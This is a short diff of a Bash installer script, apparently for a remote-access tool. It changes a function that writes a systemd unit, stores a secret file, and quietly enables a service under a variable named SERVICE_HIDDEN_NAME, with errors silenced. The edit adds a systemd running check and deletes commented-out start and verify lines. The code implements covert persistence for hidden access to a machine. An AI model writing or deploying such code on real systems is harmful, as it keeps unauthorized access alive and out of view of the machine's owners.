@@ -490,6 +490,7 @@ install_system_systemd()
 {
 	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
 	command -v systemctl >/dev/null || return
+	systemctl is-system-running &>/dev/null || return
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
@@ -519,14 +520,9 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 	chmod 600 "${SERVICE_FILE}"
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 
-	# (systemctl enable "${SERVICE_HIDDEN_NAME}" && \
-	# systemctl start "${SERVICE_HIDDEN_NAME}" && \
-	# systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { systemctl disable "${SERVICE_HIDDEN_NAME}" 2>/dev/null; rm -f "${SERVICE_FILE}"; return; } # did not work...
-
 	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
-	# IS_GS_RUNNING=1
 	IS_INSTALLED=1
 }
 
